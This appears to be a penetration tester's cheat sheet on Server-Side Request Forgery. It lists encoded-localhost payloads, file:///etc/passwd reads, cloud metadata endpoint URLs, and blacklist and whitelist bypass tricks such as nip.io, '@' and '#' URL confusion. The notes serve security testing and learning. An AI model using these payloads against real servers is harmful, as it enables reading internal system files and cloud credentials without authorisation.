# Server-Side Reqeuest Forgery (SSRF)
## What is SSRF?
In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. An SSRF vulnerability allows an attacker to make requests originating from the server.

* Blind SSRF - Allows to scan for accessible hosts and ports
* Full Response - Allows you to see the entire response from the server
* Limited or No Response - Shows a portion of the response like the title of the page or No Response or you have access to resources but can't see them directly.

## SSRF
* Convert IP Address to decimal
`python3 /opt/ipaddr/ip2dh.py D 127.0.0.1`

* Convert IP Address to hexadecimal
`python3 /opt/ipaddr/ip2dh.py H 127.0.0.1`

| Info | Command |
|:-----|:--------|
| Check for SQL | `http://127.0.0.1:3306` |
| Check for SQL | `http://localhost:3306` |
| Check for SQL Decimal | `http://2130706433:3306` |
| Check for SQL Hex | `http://0x7f000001:3306` |
| Check for SQL IPv6 | `http://[::]:3306` |
| Check for SQL IPv6 | `http://:::3306` |
| Check for files | `file:///etc/passwd` |

2130706433
017700000001
127.1
spoofed.burpcollaborator.net

## Blind SSRF
Can't see the results however can gain some insight due to the response time. 

## Limited Response
| Request | Response |
|:--------|:---------|
| `/images/proxy?url=http://10.0.0.1/` | `HTTP/1.1 200 OK` |
| `/images/proxy?url=http://10.0.0.1:87/` | `HTTP/1.1 404 Not Found | 408 Request Timeout` |
| `/images/proxy?url=http://10.0.0.1:8080/` | `HTTP/1.1 200 OK` |

## Potential Blockers
* Whitelisting - Only allows a few domain names to be used in the request
* Blacklisting - Block access to internal IP addresses, domains or keyworks
* Restricted Content-Type, extensions, or characters - Only allows a particular file type
* No Response - You may not be able to see the responise from the request

## Potential Solutions
* Whitelisting - Finding an open redirect
* Blacklisting - Creating a custom CNAME and pointing it to our internnal IP address on our target
* Restricted Content-Type, extensions, or characters - Manual fuzzing and creating a bypass
* No Response - JavaScript XHR request to retrieve file contents

## Things to keep in mind
* You are making a server side request
* You are browsing content that is rendering on the host machine
* There are different ways to look for content on localhost other than "localhost" or 127.0.0.1
* You may need to use an open redirect to redirect the machine to your destination host
* The curent host may be able to communicate with other machines on the network (that may require being on corporate VPN)
* Make sure the request comes from the remote server and not your personal IP address

TL;DR: You have a "browser" that's rendering web pages for you on the host machine

## Get Cloud Metadata
| Info | Link |
|:-----|:-----|
| Azure | https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=windows |
| AWS | https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html |
| Digital Ocean | https://docs.digitalocean.com/reference/api/metadata-api/ |
| Google Cloud | https://cloud.google.com/compute/docs/metadata/overview |

## URI Schemes
https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml

## Default Cloud Metadata Link
http://169.254.169.254/metadata/v1/

## Blacklist bypass
If internal URLs are blocked you can use a service like the ones below. 

http://169.254.169.254.sslip.io/metadata/v1/
http://169.254.169.254.nip.io/metadata/v1/
https://sslip.io/
https://nip.io/

## Whitelist bypass
You can embed credentials in a URL before the hostname, using the @ character. For example: https://expected-host@evil-host.
You can use the # character to indicate a URL fragment. For example: https://evil-host#expected-host.
You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host.
You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
You can use combinations of these techniques together.

